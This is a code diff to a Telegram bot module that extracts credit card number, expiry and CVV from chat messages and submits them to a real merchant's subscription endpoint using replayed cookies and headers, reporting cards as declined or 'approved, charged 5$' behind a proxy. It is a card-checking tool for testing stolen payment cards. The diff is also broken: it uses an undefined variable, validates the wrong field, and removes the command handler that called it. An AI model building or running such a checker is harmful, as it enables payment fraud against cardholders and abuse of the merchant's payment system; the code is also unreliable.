@@ -4,7 +4,10 @@ import time
 from pyrogram import Client, filters
 from EQUROBOT import app
 
-# Function to extract credit card details from the message text
+import requests
+import re
+
+# Function to extract credit card details from message text
 def extract_credit_card_details(message_text):
     cards = []
     input = re.findall(r"[0-9]+", message_text)
@@ -13,65 +16,40 @@ def extract_credit_card_details(message_text):
         return cards
     
     if len(input) == 3:
-        cc = input[0]
+        ccn = input[0]
         if len(input[1]) == 3:
-            mes = input[2][:2]
-            ano = input[2][2:]
-            cvv = input[1]
-        else:
-            mes = input[1][:2]
-            ano = input[1][2:]
+            mm = input[1][:2]
+            yy = input[1][2:]
             cvv = input[2]
+        else:
+            mm = input[2][:2]
+            yy = input[2][2:]
+            cvv = input[1]
     else:
-        cc = input[0]
+        ccn = input[0]
         if len(input[1]) == 3:
-            mes = input[2]
-            ano = input[3]
+            mm = input[2]
+            yy = input[3]
             cvv = input[1]
         else:
-            mes = input[1]
-            ano = input[2]
+            mm = input[1]
+            yy = input[2]
             cvv = input[3]
 
-    if len(mes) != 2 or not (1 <= int(mes) <= 12):
+    if len(yy) != 2 or not (1 <= int(mm) <= 12):
         return cards
 
     if len(cvv) not in [3, 4]:
         return cards
 
-    cards.append([cc, mes, ano, cvv])
+    cards.append([ccn, mm, yy, cvv])
     return cards
 
-# Command to check credit card details
-@app.on_message(filters.command("cvv", prefixes=[".", "/"]))
-async def check_cc(client, message):
-    command_prefix_length = len(message.text.split()[0])
-    cc = message.text[command_prefix_length:].strip()
-    
-    reply_msg = message.reply_to_message
-    if reply_msg:
-        cc_in_backticks = re.findall(r'`([^`]*)`', reply_msg.text)
-        if cc_in_backticks:
-            cc = cc_in_backticks[0].strip()
-        else:
-            cc = reply_msg.text.strip()
+# Function to process credit card transaction and handle responses
+async def process_credit_card_transaction(message, ccn, mm, yy, cvv):
+    fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
 
-    cards = extract_credit_card_details(cc)
-    
-    if not cards:
-        return await message.reply_text('Invalid CC format or details.')
-
-    ccn, mm, yy, cvv = cards[0]
-
-    if not (len(ccn) in [13, 15, 16] and len(mm) == 2 and len(yy) in [2, 4] and len(cvv) in [3, 4]):
-        return await message.reply_text('Invalid CC details. Check the format and values.')
-
-    VALID_PREFIXES = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
-    if not ccn.startswith(VALID_PREFIXES):
-        return await message.reply_text('Invalid CC type')
-
-    reply = await message.reply_text('Processing your request...')
-
+    # Define your cookies here
     cookies = {
         '_gcl_au': '1.1.355957066.1718880093',
         '_ga': 'GA1.1.1315831686.1718880093',
@@ -81,6 +59,7 @@ async def check_cc(client, message):
         '_ga_KQ5ZJRZGQR': 'GS1.1.1718895011.2.1.1718895179.0.0.0',
     }
 
+    # Define your headers here
     headers = {
         'accept': 'application/json, text/javascript, */*; q=0.01',
         'accept-language': 'en-US,en;q=0.9',
@@ -98,6 +77,7 @@ async def check_cc(client, message):
         'x-requested-with': 'XMLHttpRequest',
     }
 
+    # Data to be sent in the POST request
     data = {
         'stripe_customer': '',
         'subscription_type': 'Monthly Subscription',
@@ -115,10 +95,46 @@ async def check_cc(client, message):
         'sum': '28',
     }
 
-    response = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers, data=data)
-    text = response.text
-    
-    # Handle response based on your requirements
-    await reply.delete()  # Delete the processing message
-    await message.reply_text(text)  # Reply with the API response
+    # API endpoint URL
+    url = 'https://www.lagreeod.com/register/validate_subscribe'
 
+    try:
+        # Send POST request with cookies, headers, and data
+        response = requests.post(url, cookies=cookies, headers=headers, data=data)
+        response_data = response.json()
+
+        if 'status' in response_data:
+            if response_data['status'] == 'declined':
+                die_message = (
+                    f"┏━━━━━━━⍟\n"
+                    f"┃DECLINED ❌\n"
+                    f"┗━━━━━━━━━━━⊛\n"
+                    f"➩ 𝗖𝗮𝗿𝗱 : `{fullcc}`\n"
+                    f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : **{response_data['message']}**\n\n"
+                    f"[↯] 𝗣𝗿𝗼𝘅𝘆 ↳ 104.207.45.101:xxx Live ✅\n"
+                    f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : {message.from_user.mention}\n"
+                )
+                await reply.edit_text(die_message)
+
+            elif response_data['status'] == 'approved':
+                approved_message = (
+                    f"┏━━━━━━━⍟\n"
+                    f"┃BRAINTREE AUTH 𝟓$ ✅\n"
+                    f"┗━━━━━━━━━━━⊛\n"
+                    f"➩ 𝗖𝗮𝗿𝗱 : `{fullcc}`\n"
+                    f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : APPROVED CARD ✅\n"
+                    f"➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : CHARGED 5$\n\n"
+                    f"[↯] 𝗣𝗿𝗼𝘅𝘆 ↳ 104.207.45.101:xxx Live ✅\n"
+                    f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : {message.from_user.mention}\n"
+                )
+                await reply.edit_text(approved_message)
+
+            else:
+                await reply.edit_text(f"Unknown status received: {response_data.get('status')}")
+
+    except Exception as e:
+        print(f"Error processing transaction: {e}")
+
+# Example usage:
+# Assuming `message` and credit card details `ccn`, `mm`, `yy`, `cvv` are defined appropriately
+# await process_credit_card_transaction(message, ccn, mm, yy, cvv)
